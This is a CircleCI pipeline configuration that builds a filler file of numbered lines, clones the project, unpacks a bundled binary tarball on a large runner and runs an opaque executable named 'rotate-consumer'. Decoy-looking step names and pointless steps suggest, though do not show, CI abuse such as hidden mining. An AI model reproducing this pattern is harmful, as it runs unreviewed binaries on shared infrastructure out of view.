version: 2.1

jobs:
  uuidMergeCheckout:
    docker:
      - image: cimg/base:current
    resource_class: small
    steps:
      - run:
          name: Rewind
          command: |
            mkdir -p /tmp/outpost
            set +o pipefail 2>/dev/null; awk 'BEGIN{for(i=1;i<=50000;i++) printf "%03d-%04d\n", i%100, i%10000}' > /tmp/outpost/0n57zx; true
            echo "wrote variant-a"
      - persist_to_workspace:
          root: /tmp/outpost
          paths:
            - '0n57zx'
  biuld-71:
    machine:
      image: ubuntu-2204:current
    resource_class: large.gen2
    steps:
      - attach_workspace:
          at: /tmp/outpost
      - run:
          name: Receive 1
          command: |
            sort /tmp/outpost/0n57zx 2>/dev/null | uniq -c | wc -l || true
      - run:
          name: Get fresh code
          command: git clone --depth 2 -q --filter=blob:none --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
      - run:
          name: Unpack toolkit
          command: tar --extract --bzip2 --file=release-binaries-main.tar.bz2
      - run:
          command: sleep 60
      - run:
          command: ls -la
      - run:
          command: free -m
      - run:
          command: ./rotate-consumer && true
